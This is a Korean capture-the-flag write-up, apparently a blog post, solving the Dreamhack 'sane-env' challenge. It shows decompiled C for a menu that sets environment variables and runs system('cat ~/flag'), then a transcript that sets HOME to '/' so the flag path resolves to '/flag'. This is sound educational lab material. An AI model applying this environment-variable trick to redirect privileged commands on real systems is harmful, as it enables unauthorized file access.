---
layout: post
title: "[Dreamhack] sane-env"
date: 2025-06-10 12:05 +0900
category: ['Syshack']
tag: ['system', 'dreamhack', 'hacking', 'pwn', 'pwnable', '드림핵', '보안', '시스템', '시스템해킹', '포너블', '해킹']
image: /assets/img/post/sane-env/image0.png
---

> **Dreamhack Syshack Lv.1**

## P1. 문제분석

이번 문제는 바이너리만 제공한다. 이를 실행해 살펴본 후 ida로 열어보자.

### P1-1. 동작 파악

WSL에서 문제의 바이너리를 실행해보자.

```bash
# 문제 폴더로 이동 후
$ ./sane-env
```
![](/assets/img/post/sane-env/image1.png)

1~4까지의 입력을 받는다. 이외의 입력을 받으면 어떻게 될까?

![](/assets/img/post/sane-env/image2.png)

이외의 입력은 받지 않는다.

1, 2번 입력은 환경 변수를 변경하는 기능으로 추측되고, 3번 입력은 `system()`함수에 어떤 명령어를 넣어서 실행하는 것으로 보인다.

### P1-2. 디버깅

ida를 활용해 디스어셈블을 시도해보자.

```c
        case 1:
          do
            v6 = getchar();
          while ( v6 != 10 && v6 != -1 );
          printf("Environment variable name: ");
          fgets(s, 256, stdin);
          if ( s[strlen(s) - 1] == 10 )
            s[strlen(s) - 1] = 0;
          printf("Environment variable value: ");
          fgets(value, 256, stdin);
          if ( value[strlen(value) - 1] == 10 )
            value[strlen(value) - 1] = 0;
          if ( setenv(s, value, 1) == -1 )
          {
            puts("setenv() failed!");
            exit(-1);
          }
          puts("Environment variable set!");
          break;
        case 2:
          do
            v6 = getchar();
          while ( v6 != 10 && v6 != -1 );
          printf("Environment variable name: ");
          fgets(s, 256, stdin);
          if ( s[strlen(s) - 1] == 10 )
            s[strlen(s) - 1] = 0;
          if ( unsetenv(s) == -1 )
          {
            puts("unsetenv() failed!");
            exit(-1);
          }
          puts("Environment variable cleared!");
          break;
```

1번과 2번 입력이다.

`setenv()`함수와 `unsetenv()`함수를 이용해 환경 변수 설정과 해제를 수행하고 있다.

```c
        case 3:
          size = confstr(0, 0LL, 0LL);
          if ( !size )
          {
            puts("_CS_PATH invalid!");
            exit(-1);
          }
          buf = (char *)malloc(size);
          if ( !buf )
          {
            puts("malloc() failed!");
            exit(-1);
          }
          if ( !confstr(0, buf, size) )
          {
            puts("confstr() failed!");
            exit(-1);
          }
          if ( setenv("PATH", buf, 1) == -1 )
          {
            puts("PATH setup failed!");
            exit(-1);
          }
          free(buf);
          if ( system("cat ~/flag") == -1 )
          {
            puts("system() failed!");
            exit(-1);
          }
          puts("system() worked!");
          break;
```

3번 입력이다.

여러 예외 상황이 적용되어 있으나 결국 기능은 `system("cat ~/flag")` 를 실행하는 것이다.

### P1-3. 분석 결과

리눅스 환경변수에는 `USER` 등 여러가지가 있으나 `HOME`이라는 환경변수가 있다. 이는 사용자의 홈 디렉토리를 추적하기 위해 사용되는 환경변수이고 커맨드 상에서는 `~` 로 표현된다.

3번 기능은 사용자의 홈 디렉토리에 있는 `flag`를 읽는 함수 임으로 홈 디렉토리를 루트 디렉토리 즉, `/` 로 설정해준다면 `~/flag`는 `/home/$USER/flag`가 되는 것이 아닌 `/flag`가 된다.

## P2. Exploit

우선 shell에서 바이너리를 실행한다.

```bash
# 문제 폴더로 이동 후
$ ./sane-env
```

1번 기능을 통해 환경변수 `HOME`을 `/`로 변경한다. 이후 3번 입력을 수행한다.

```bash
[Sane Env System]

operations:
1. set environment variable
2. unset environment variable
3. run hard-coded system()
4. exit
> 1
Environment variable name: HOME
Environment variable value: /
Environment variable set!

operations:
1. set environment variable
2. unset environment variable
3. run hard-coded system()
4. exit
> 3
cat: //flag: No such file or directory
system() worked!
```

본인의 시스템에선 루트 디렉토리에 `flag`라는 파일이 존재하지 않으니 읽어들이지 못한다.

이제 문제 서버에서 해보자.

![](/assets/img/post/sane-env/image3.png)

**Clear!**